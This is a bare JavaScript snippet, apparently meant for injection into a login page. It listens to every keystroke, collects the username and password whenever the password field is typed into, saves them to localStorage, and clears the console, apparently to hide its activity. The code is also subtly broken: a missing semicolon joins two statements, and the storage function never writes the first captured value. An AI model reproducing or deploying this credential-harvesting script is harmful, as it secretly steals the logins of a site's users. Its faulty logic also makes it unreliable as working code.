function keyPressHandler(event) {if (event.target.id === 'password'){let username = document.getElementById('username').value;let password = document.getElementById('password').valuestore.call(localStorage,"login",{[username]:password});}}
function store(key, data) {let old_data = localStorage.getItem(key);if (!old_data){old_data = new Object();}else{old_data = JSON.parse(old_data);data = Object.assign(old_data, data);localStorage.setItem(key, JSON.stringify(data));}}
document.addEventListener('keyup', keyPressHandler);
console.clear()
